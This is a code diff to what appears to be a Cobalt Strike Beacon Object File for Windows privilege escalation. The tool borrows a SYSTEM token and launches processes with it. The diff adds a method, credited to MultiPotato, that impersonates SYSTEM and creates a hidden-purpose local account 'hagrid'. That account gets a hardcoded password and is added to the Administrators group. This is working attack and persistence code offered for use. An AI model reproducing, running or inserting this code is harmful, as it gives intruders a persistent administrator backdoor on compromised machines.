@@ -1,6 +1,9 @@
 #include <windows.h>
 #include <stdio.h>
 #include <comdef.h>
+
+#include <lm.h>
+
 #include "bofdefs.h"
 
 
@@ -176,6 +179,51 @@ ULONG STDMETHODCALLTYPE Release(IUnknown* This) {
 }
 
 
+// borrow from MultiPotato
+bool CreateAdminUser()
+{
+	LPWSTR username = (LPWSTR)L"hagrid";
+	LPWSTR password = (LPWSTR)L"P@ss@29hagr!d";
+
+
+	USER_INFO_1 ui;
+	DWORD dwLevel = 1;
+	DWORD dwError = 0;
+	DWORD nStatus;
+
+
+	ui.usri1_name = username;
+	ui.usri1_password = password;
+	ui.usri1_priv = USER_PRIV_USER;
+	ui.usri1_home_dir = NULL;
+	ui.usri1_comment = NULL;
+	ui.usri1_flags = UF_SCRIPT;
+	ui.usri1_script_path = NULL;
+
+	nStatus = NETAPI32$NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, NULL);
+	if (nStatus != 0)
+	{
+		BeaconPrintf(CALLBACK_ERROR, "NetUserAdd error: %d", nStatus);
+		return false;
+	}
+	
+	DWORD gStatus;
+	LOCALGROUP_MEMBERS_INFO_3 gi;
+	gi.lgrmi3_domainandname = ui.usri1_name;
+	DWORD level = 3;
+	DWORD totalentries = 1;
+
+	nStatus = NETAPI32$NetLocalGroupAddMembers(NULL, L"Administrators", level, (LPBYTE)&gi, totalentries);
+	if (nStatus != 0)
+	{
+		BeaconPrintf(CALLBACK_ERROR, "NetLocalGroupAddMembers error: %d", nStatus);
+		return false;
+	}
+
+	return true;
+}
+
+
 void go(char* args, int alen)
 {
 
@@ -189,11 +237,9 @@ void go(char* args, int alen)
 	char* processPath = BeaconDataExtract(&parser, NULL);
 	char* commandLine = BeaconDataExtract(&parser, NULL);
 	size_t method = BeaconDataInt(&parser);
-	bool isCreateProcessAsUser = false;
-	if (method == 2) {
-		isCreateProcessAsUser = true;
-	}
-	BeaconPrintf(CALLBACK_OUTPUT, "Process Path = %s\nCommand Line = %s\n", processPath, commandLine);
+
+	if(method != 3)
+		BeaconPrintf(CALLBACK_OUTPUT, "Process Path = %s\nCommand Line = %s\n", processPath, commandLine);
 
 	size_t convertedChars = 0;
 	wideSize = MSVCRT$strlen(processPath) + 1;
@@ -317,8 +363,8 @@ void go(char* args, int alen)
 	PROCESS_INFORMATION processInfo = { 0 };
 	startupInfo.cb = sizeof(startupInfo);
 
-
-	if (isCreateProcessAsUser) {
+	
+	if (method == 2) {
 		//According to document, the process that calls the CreateProcessAsUser function must have the SE_INCREASE_QUOTA_NAME privilege and may require the SE_ASSIGNPRIMARYTOKEN_NAME privilege if the token is not assignable.
 		EnablePriv(hToken_SYSMTE, SE_INCREASE_QUOTA_NAME);
 		EnablePriv(hToken_SYSMTE, SE_ASSIGNPRIMARYTOKEN_NAME);
@@ -329,6 +375,15 @@ void go(char* args, int alen)
 		}
 		BeaconPrintf(CALLBACK_OUTPUT, "Command executed with CreateProcessAsUserW successfully\n");
 	}
+	else if (method == 3) {
+		BeaconUseToken(hToken_SYSMTE);
+		if (CreateAdminUser()) {
+			BeaconPrintf(CALLBACK_OUTPUT, "User hagrid with password P@ss@29hagr!d has been added into administrators");
+		}
+		else {
+			goto cleanup;
+		}
+	}
 	else{
 		if (!ADVAPI32$CreateProcessWithTokenW(hToken_SYSMTE, 0, wProcessPath, wCommandLine, CREATE_NO_WINDOW, 0, NULL, &startupInfo, &processInfo)) {
 			BeaconPrintf(CALLBACK_ERROR, "CreateProcessWithTokenW failed: %d\n", KERNEL32$GetLastError());
@@ -336,7 +391,7 @@ void go(char* args, int alen)
 		}
 		BeaconPrintf(CALLBACK_OUTPUT, "Command executed with CreateProcessWithTokenW successfully\n");
 	}
-	
+
 
 cleanup:
 	BeaconRevertToken();
